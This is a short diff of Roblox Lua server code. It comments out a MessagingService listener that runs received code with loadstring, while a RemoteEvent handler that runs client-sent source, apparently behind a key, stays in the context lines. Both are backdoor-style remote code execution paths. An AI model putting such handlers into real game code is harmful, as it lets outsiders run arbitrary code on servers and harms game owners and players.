@@ -46,7 +46,7 @@ remote.OnServerEvent:Connect(function(plr, key, src)
         loadstring(src)()
     end
 end)
-
+--[[
 MessagingService:SubscribeAsync("Bice", function(message)
     local data = message.Data
 
@@ -55,4 +55,4 @@ MessagingService:SubscribeAsync("Bice", function(message)
     end
 
     loadstring(data.Data)()
-end)
+end)]]
